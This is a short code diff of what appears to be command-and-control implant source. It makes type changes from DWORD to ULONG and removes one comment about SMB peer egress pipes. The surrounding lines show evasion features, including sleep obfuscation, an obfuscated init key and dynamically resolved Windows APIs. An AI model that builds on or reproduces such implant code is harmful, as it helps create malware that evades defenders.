@@ -46,7 +46,7 @@ namespace Core {
         FreeApi(Ctx);
     }
 
-    VOID HandleTask (DWORD msgType) {
+    VOID HandleTask (ULONG msgType) {
         HEXANE
 
         SleepObf();
@@ -71,7 +71,7 @@ namespace Core {
         UCHAR advapi32[] = ADVAPI32;
         UCHAR iphlpapi[] = IPHLPAPI;
 
-        DWORD KERNEL32              = { };
+        ULONG KERNEL32              = { };
         OSVERSIONINFOW OSVersionW   = { };
 
         if (!(FPTR2(Ctx->Nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
@@ -275,7 +275,7 @@ namespace Core {
         HEXANE
 
         PARSER Parser       = { };
-        DWORD nEndpoints    = 0;
+        ULONG nEndpoints    = 0;
         BYTE InitKey[]      = OBF_KEY;
 
         Ctx->LE = TRUE;
@@ -334,7 +334,6 @@ namespace Core {
 #endif
 #ifdef TRANSPORT_PIPE
         ParserWcscpy(&Parser, &Ctx->Config.EgressPipename);
-    // Smb Configuration: if this is an smb peer, it must have a "Peer" (egress pipe)
 #endif
 
         DestroyParser(&Parser);
